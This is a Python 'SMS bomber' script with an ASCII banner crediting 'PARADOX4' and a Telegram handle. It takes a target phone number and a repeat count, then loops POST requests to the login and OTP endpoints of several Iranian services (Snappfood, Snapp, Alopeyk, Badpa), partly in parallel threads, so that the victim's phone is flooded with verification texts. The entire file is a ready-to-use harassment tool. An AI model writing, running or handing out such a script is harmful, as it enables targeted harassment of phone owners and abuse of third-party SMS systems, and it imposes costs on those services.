from  threading import  Thread
import requests as req
import time
from colorama import Fore
phone=int(input(Fore.GREEN+"[ Phone target ]"+Fore.RED+" =>" ))
num =int(input(Fore.GREEN+"send:"+Fore.RED))
def snap(phone , num):
        print(Fore.GREEN+'''
         _____                _   _           _____
        /  ___|              | | | |         |_   _|
        \ `--. _ __ ___  ___ | |_| |_   _ _ __ | | ___ _ __
         `--. \ '_ ` _ \/ __||  _  | | | | '_ \| |/ _ \ '__|
        /\__/ / | | | | \__ \| | | | |_| | | | | |  __/ |
        \____/|_| |_| |_|___/\_| |_/\__,_|_| |_\_/\___|_|
        ________________________________________________
        |                                               |
        |         T.ME/IrHack_PARADOX4  |
        |                                               |
        |           coding by PARADOX4                  |
        |_______________________________________________|
        ''')


        url="https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass"
        data ={"cellphone": phone}
        for i in range(0,num):
            req.session()
            r =req.post(url,data=data)
            print(Fore.GREEN+"[~]"+Fore.CYAN+"[snapfood send]")
snap(phone, num)
def snapp(phone , num):

        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        data ={"cellphone": phone}
        for i in range(0,num):
            req.session()
            r =req.post(url,data=data)
            print(Fore.GREEN+"[+]"+Fore.RED+"[snapp send]")
snapp(phone ,num)
def al(phone , num):

        url="https://alopeyk.com/api/sms/send.php"
        data ={"phone": phone}
        for i in range(0,num):
            req.session()
            r =req.post(url,data=data)
            print(Fore.GREEN+"[+]"+Fore.BLUE+"[alopeyk send]")
al(phone ,num)
def badpa(phone ,num):
    url="http://badpa.parsadp.com/api/v1.0/fa/customer"
    data ={"cell_phone":phone}
    for i in range(0,num):
        req.session()
        r =req.post(url,data=data)
        print(Fore.MAGENTA+"[+]"+Fore.RED+"[badpa send]")
tr3=Thread(target=snapp,args=[phone , num])

tr4=Thread(target=al,args=[phone , num])

tr5 =Thread(target=badpa,args=[phone , num])

tr3.start()
tr4.start()
tr5.start()
